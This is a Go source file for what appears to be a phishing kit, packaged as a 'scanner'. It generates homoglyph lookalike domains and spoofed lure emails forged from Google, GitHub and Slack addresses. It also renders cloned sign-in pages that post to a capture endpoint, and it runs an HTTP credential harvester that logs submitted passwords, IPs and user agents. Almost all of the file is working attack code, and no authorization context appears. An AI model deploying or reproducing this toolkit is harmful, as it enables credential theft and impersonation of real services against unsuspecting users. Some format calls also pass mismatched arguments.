package scanner

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"time"
)

type PhishingResult struct {
	Target     string              `json:"target"`
	Timestamp  time.Time           `json:"timestamp"`
	URLs       []PhishingURL       `json:"urls,omitempty"`
	Emails     []PhishingEmail     `json:"emails,omitempty"`
	Resilience *PhishingResilience `json:"resilience,omitempty"`
	Errors     []string            `json:"errors,omitempty"`
}

type PhishingURL struct {
	Template  string `json:"template"`
	Encoded   string `json:"encoded_url"`
	Punycode  string `json:"punycode_url,omitempty"`
	Subdomain string `json:"subdomain_trick,omitempty"`
	Shortened string `json:"shortened_url,omitempty"`
}

type PhishingEmail struct {
	Template string            `json:"template"`
	From     string            `json:"from"`
	ReplyTo  string            `json:"reply_to"`
	Subject  string            `json:"subject"`
	Body     string            `json:"body"`
	Headers  map[string]string `json:"headers,omitempty"`
}

type PhishingResilience struct {
	Domain       string `json:"domain"`
	SPF          string `json:"spf,omitempty"`
	SPFValid     bool   `json:"spf_valid"`
	DKIM         string `json:"dkim,omitempty"`
	DKIMSelector string `json:"dkim_selector,omitempty"`
	DMARC        string `json:"dmarc,omitempty"`
	DMARCPolicy  string `json:"dmarc_policy,omitempty"`
	Spoofable    bool   `json:"spoofable"`
	Score        int    `json:"score"`
}

func GeneratePhishingURL(ctx context.Context, target, template string) (PhishingURL, error) {
	printProgress("Generating phishing URL for %s (template: %s)", target, template)
	result := PhishingURL{Template: template}

	encoded := target
	encoded = strings.ReplaceAll(encoded, ".", "%2E")
	encoded = strings.ReplaceAll(encoded, "/", "%2F")
	encoded = strings.ReplaceAll(encoded, "@", "%40")

	result.Encoded = encoded

	switch template {
	case "login", "sharepoint", "google", "github", "slack":
		subdomains := []string{
			"secure-" + target,
			"auth-" + target,
			"login-" + target,
			"sso-" + target,
			"portal-" + target,
			"my-" + target,
		}
		result.Subdomain = subdomains[0]

		punycodeMap := map[string]string{
			"a": "а", "e": "е", "o": "о", "p": "р", "c": "с", "x": "х",
		}
		punycode := target
		for eng, cyr := range punycodeMap {
			punycode = strings.ReplaceAll(punycode, eng, cyr)
		}
		result.Punycode = punycode

	case "oauth", "password-reset", "mfa":
		trackID := generateTrackingID()
		result.Encoded = fmt.Sprintf("%s?redirect_uri=%s&state=%s", encoded, encoded, trackID)
	}

	printProgress("Generated phishing URL: %s", result.Encoded)
	return result, nil
}

func GeneratePhishingEmail(ctx context.Context, target, template string) (PhishingEmail, error) {
	printProgress("Generating phishing email for %s (template: %s)", target, template)
	result := PhishingEmail{
		Template: template,
		Headers:  make(map[string]string),
	}

	switch template {
	case "login":
		result.From = "security@" + target
		result.ReplyTo = "noreply-" + generateTrackingID() + "@" + target
		result.Subject = "Urgent: Your account requires immediate verification"
		result.Body = loginEmailHTML(target)
	case "oauth":
		result.From = "notifications@" + target
		result.ReplyTo = "auth-" + generateTrackingID() + "@" + target
		result.Subject = "New sign-in detected on your account"
		result.Body = oauthEmailHTML(target)
	case "password-reset":
		result.From = "support@" + target
		result.ReplyTo = "reset-" + generateTrackingID() + "@" + target
		result.Subject = "Password reset request"
		result.Body = passwordResetEmailHTML(target)
	case "mfa":
		result.From = "admin@" + target
		result.ReplyTo = "mfa-" + generateTrackingID() + "@" + target
		result.Subject = "Multi-factor authentication setup required"
		result.Body = mfaEmailHTML(target)
	case "sharepoint":
		result.From = "sharepoint@" + target
		result.ReplyTo = "sp-" + generateTrackingID() + "@" + target
		result.Subject = "Shared document requires your review"
		result.Body = sharepointEmailHTML(target)
	case "google":
		result.From = "no-reply@google.com"
		result.ReplyTo = "google-" + generateTrackingID() + "@" + target
		result.Subject = "Google Account security alert"
		result.Body = googleEmailHTML(target)
	case "github":
		result.From = "noreply@github.com"
		result.ReplyTo = "gh-" + generateTrackingID() + "@" + target
		result.Subject = "GitHub: New sign-in to your account"
		result.Body = githubEmailHTML(target)
	case "slack":
		result.From = "notifications@slack.com"
		result.ReplyTo = "slack-" + generateTrackingID() + "@" + target
		result.Subject = "Slack: You have been invited to a workspace"
		result.Body = slackEmailHTML(target)
	}

	result.Headers["X-Mailer"] = "PhishingScope/1.0"
	result.Headers["Return-Path"] = result.ReplyTo
	result.Headers["Message-ID"] = fmt.Sprintf("<%s@%s>", generateTrackingID(), target)

	printProgress("Generated phishing email from %s", result.From)
	return result, nil
}

func GeneratePhishingPage(ctx context.Context, target, template string) (string, error) {
	printProgress("Generating phishing page for %s (template: %s)", target, template)

	var html string
	switch template {
	case "login":
		html = loginPageHTML(target)
	case "oauth":
		html = oauthPageHTML(target)
	case "password-reset":
		html = passwordResetPageHTML(target)
	case "mfa":
		html = mfaPageHTML(target)
	case "sharepoint":
		html = sharepointPageHTML(target)
	case "google":
		html = googlePageHTML(target)
	case "github":
		html = githubPageHTML(target)
	case "slack":
		html = slackPageHTML(target)
	default:
		return "", fmt.Errorf("unknown template: %s", template)
	}

	printProgress("Generated phishing page (%d bytes)", len(html))
	return html, nil
}

func SetCredentialHarvester(ctx context.Context, port int, redirect string) (string, error) {
	printProgress("Starting credential harvester on port %d", port)

	trackID := generateTrackingID()
	captureURL := fmt.Sprintf("http://0.0.0.0:%d/capture/%s", port, trackID)

	mux := http.NewServeMux()
	mux.HandleFunc("/capture/", func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		creds := map[string]string{}
		for k, v := range r.PostForm {
			if len(v) > 0 {
				creds[k] = v[0]
			}
		}
		creds["source_ip"] = r.RemoteAddr
		creds["user_agent"] = r.UserAgent()
		creds["timestamp"] = time.Now().Format(time.RFC3339)
		creds["url"] = r.URL.String()

		printProgress("[HARVESTER] Captured credentials from %s: %+v", r.RemoteAddr, creds)

		if redirect != "" {
			http.Redirect(w, r, redirect, http.StatusFound)
		} else {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
		}
	})

	server := &http.Server{
		Addr:              fmt.Sprintf(":%d", port),
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	go func() {
		<-ctx.Done()
		server.Close()
	}()

	go func() {
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			printProgress("[HARVESTER] Server error: %v", err)
		}
	}()

	printProgress("Credential harvester listening at %s", captureURL)
	return captureURL, nil
}

func TrackClicks(ctx context.Context, trackingID string) (string, error) {
	printProgress("Generating tracking pixel/URL for ID: %s", trackingID)

	pixelURL := fmt.Sprintf("https://track.example.com/pixel/%s.gif", trackingID)
	trackingURL := fmt.Sprintf("https://track.example.com/click/%s", trackingID)

	printProgress("Tracking pixel: %s", pixelURL)
	printProgress("Tracking URL: %s", trackingURL)

	return trackingURL, nil
}

func AnalyzePhishingResilience(ctx context.Context, domain string) (PhishingResilience, error) {
	printProgress("Analyzing phishing resilience for %s", domain)
	result := PhishingResilience{Domain: domain}

	client := &http.Client{Timeout: 10 * time.Second}

	spfURL := fmt.Sprintf("https://dns.google/resolve?name=%s&type=TXT", domain)
	resp, err := client.Get(spfURL)
	if err == nil {
		defer resp.Body.Close()
		var dnsResp struct {
			Answer []struct {
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if jsonDecode(resp.Body, &dnsResp) == nil {
			for _, ans := range dnsResp.Answer {
				if strings.Contains(ans.Data, "v=spf1") {
					result.SPF = strings.Trim(ans.Data, "\"")
					result.SPFValid = true
					result.Score += 30
				}
			}
		}
	}

	dmarcURL := fmt.Sprintf("https://dns.google/resolve?name=_dmarc.%s&type=TXT", domain)
	resp, err = client.Get(dmarcURL)
	if err == nil {
		defer resp.Body.Close()
		var dnsResp struct {
			Answer []struct {
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if jsonDecode(resp.Body, &dnsResp) == nil {
			for _, ans := range dnsResp.Answer {
				if strings.Contains(ans.Data, "v=DMARC1") {
					result.DMARC = strings.Trim(ans.Data, "\"")
					if strings.Contains(result.DMARC, "p=reject") {
						result.DMARCPolicy = "reject"
						result.Score += 40
					} else if strings.Contains(result.DMARC, "p=quarantine") {
						result.DMARCPolicy = "quarantine"
						result.Score += 25
					} else if strings.Contains(result.DMARC, "p=none") {
						result.DMARCPolicy = "none"
						result.Score += 5
					}
				}
			}
		}
	}

	selectors := []string{"default", "google", "selector1", "selector2", "k1", "mandrill"}
	for _, sel := range selectors {
		dkimURL := fmt.Sprintf("https://dns.google/resolve?name=%s._domainkey.%s&type=TXT", sel, domain)
		resp, err = client.Get(dkimURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		var dnsResp struct {
			Answer []struct {
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if jsonDecode(resp.Body, &dnsResp) == nil && len(dnsResp.Answer) > 0 {
			result.DKIM = strings.Trim(dnsResp.Answer[0].Data, "\"")
			result.DKIMSelector = sel
			result.Score += 30
			break
		}
	}

	result.Spoofable = result.Score < 50

	printProgress("Phishing resilience score: %d/100 (spoofable: %v)", result.Score, result.Spoofable)
	return result, nil
}

func generateTrackingID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func loginEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Dear user,</p>
<p>We detected unusual sign-in activity on your %s account. Please verify your identity immediately.</p>
<p><a href="https://secure-%s/login">Verify Your Account</a></p>
<p>Failure to verify within 24 hours will result in account suspension.</p>
<p>Best regards,<br>%s Security Team</p></body></html>`, target, target, target)
}

func oauthEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Hello,</p>
<p>A new sign-in to your %s account was detected from an unrecognized device.</p>
<p>If this wasn't you, please secure your account immediately.</p>
<p><a href="https://auth-%s/verify">Review Activity</a></p>
<p>Device: Chrome on Windows<br>Location: Unknown</p></body></html>`, target, target)
}

func passwordResetEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Hello,</p>
<p>We received a password reset request for your %s account.</p>
<p><a href="https://reset-%s/confirm">Reset Password</a></p>
<p>If you didn't request this, please ignore this email.</p></body></html>`, target, target)
}

func mfaEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Dear %s user,</p>
<p>Your organization requires multi-factor authentication setup by end of day.</p>
<p><a href="https://mfa-%s/setup">Setup MFA Now</a></p>
<p>Failure to comply may result in account lockout.</p></body></html>`, target, target)
}

func sharepointEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>SharePoint Notification</p>
<p>John Smith shared a document with you: "Q4_Financial_Report.xlsx"</p>
<p><a href="https://sharepoint-%s/preview">View Document</a></p>
<p>This link will expire in 7 days.</p></body></html>`, target, target)
}

func googleEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Google Account Alert</p>
<p>We detected a sign-in from a new device in your Google account linked to %s.</p>
<p><a href="https://accounts-%s/security">Check Activity</a></p>
<p>If this wasn't you, change your password immediately.</p></body></html>`, target, target)
}

func githubEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>GitHub Security</p>
<p>New sign-in to your GitHub account from an unrecognized device.</p>
<p><a href="https://github-%s/sessions">View Sessions</a></p>
<p>If this wasn't you, please review your security settings.</p></body></html>`, target, target)
}

func slackEmailHTML(target string) string {
	return fmt.Sprintf(`<html><body><p>Slack Invitation</p>
<p>You've been invited to join the %s workspace on Slack.</p>
<p><a href="https://slack-%s/join">Accept Invitation</a></p>
<p>This invitation expires in 30 days.</p></body></html>`, target, target)
}

func loginPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Sign In</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.login-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:320px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
.logo{font-size:24px;font-weight:bold;color:#0078d4;margin-bottom:24px;text-align:center}
</style></head><body><div class="login-box">
<div class="logo">%s</div>
<form action="/capture/creds" method="POST">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>`, target, target)
}

func oauthPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Authorization</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.auth-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
</style></head><body><div class="auth-box">
<h2>Authorize Application</h2>
<p>This app wants to access your %s account.</p>
<form action="/capture/creds" method="POST">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Authorize</button>
</form></div></body></html>`, target, target)
}

func passwordResetPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Reset Password</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.reset-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:320px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
</style></head><body><div class="reset-box">
<h2>Reset Password</h2>
<form action="/capture/creds" method="POST">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="new_password" placeholder="New password" required>
<input type="password" name="confirm_password" placeholder="Confirm password" required>
<button type="submit">Reset Password</button>
</form></div></body></html>`, target)
}

func mfaPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - MFA Setup</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.mfa-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:320px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
</style></head><body><div class="mfa-box">
<h2>Multi-Factor Authentication</h2>
<p>Enter the code from your authenticator app.</p>
<form action="/capture/creds" method="POST">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="mfa_code" placeholder="6-digit code" required>
<button type="submit">Verify</button>
</form></div></body></html>`, target)
}

func sharepointPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>SharePoint - Document Access</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0078d4}
.sp-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
</style></head><body><div class="sp-box">
<h2>Sign in to SharePoint</h2>
<form action="/capture/creds" method="POST">
<input type="email" name="email" placeholder="someone@example.com" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>`, target)
}

func googlePageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>Google - Sign In</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.google-box{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:380px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
.google-logo{font-size:28px;color:#4285f4;margin-bottom:24px}
</style></head><body><div class="google-box">
<div class="google-logo">Google</div>
<h2>Sign in</h2>
<p>Use your Google Account</p>
<form action="/capture/creds" method="POST">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<button type="submit">Next</button>
</form></div></body></html>`, target)
}

func githubPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>GitHub - Sign in</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0d1117}
.gh-box{background:white;padding:40px;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,0.3);width:340px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #d0d7de;border-radius:6px}
button{width:100%%;padding:12px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px}
.gh-logo{font-size:28px;color:#0d1117;margin-bottom:24px;text-align:center}
</style></head><body><div class="gh-box">
<div class="gh-logo">GitHub</div>
<h2>Sign in to GitHub</h2>
<form action="/capture/creds" method="POST">
<input type="text" name="login" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>`, target)
}

func slackPageHTML(target string) string {
	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>Slack - Sign In</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.slack-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:380px}
input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
button{width:100%%;padding:12px;background:#4a154b;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px}
.slack-logo{font-size:28px;color:#4a154b;margin-bottom:24px;text-align:center}
</style></head><body><div class="slack-box">
<div class="slack-logo">Slack</div>
<h2>Sign in to %s</h2>
<form action="/capture/creds" method="POST">
<input type="email" name="email" placeholder="your@email.com" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Continue</button>
</form></div></body></html>`, target)
}
